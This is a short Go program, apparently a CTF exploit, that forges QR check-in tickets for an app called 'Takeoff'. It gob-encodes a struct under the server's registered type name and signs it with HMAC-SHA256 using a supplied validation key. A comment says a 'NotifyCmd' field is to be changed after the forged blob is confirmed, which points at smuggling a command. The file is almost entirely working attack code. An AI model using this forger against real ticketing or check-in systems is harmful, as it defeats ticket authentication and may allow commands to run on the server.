// forge_checkin.go — Takeoff check-in QR forger.
//
// The app gob-encodes an interface holding *VerifyTicketAuthenticity
// (registered name "*gob.VerifyTicketAuthenticity") then appends
// HMAC-SHA256(TICKET_VALIDATION_TOKEN, gobBytes) as 32 raw bytes.
//
//	go run . '<json>' '<hmac-key>'
//
// Match the original blob on unmodified JSON before changing NotifyCmd.
package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"os"
)

type VerifyTicketAuthenticity struct {
	Data []byte
}

func main() {
	if len(os.Args) < 3 {
		fmt.Fprintf(os.Stderr, "usage: forge_checkin <json> <key>\n")
		os.Exit(1)
	}
	js := []byte(os.Args[1])
	key := []byte(os.Args[2])

	// Leading '*' is part of the registered name the server used.
	gob.RegisterName("*gob.VerifyTicketAuthenticity", (*VerifyTicketAuthenticity)(nil))
	var buf bytes.Buffer
	enc := gob.NewEncoder(&buf)
	var v any = &VerifyTicketAuthenticity{Data: js}
	if err := enc.Encode(&v); err != nil {
		panic(err)
	}
	mac := hmac.New(sha256.New, key)
	mac.Write(buf.Bytes())
	out := append(buf.Bytes(), mac.Sum(nil)...)
	fmt.Print(base64.StdEncoding.EncodeToString(out))
}
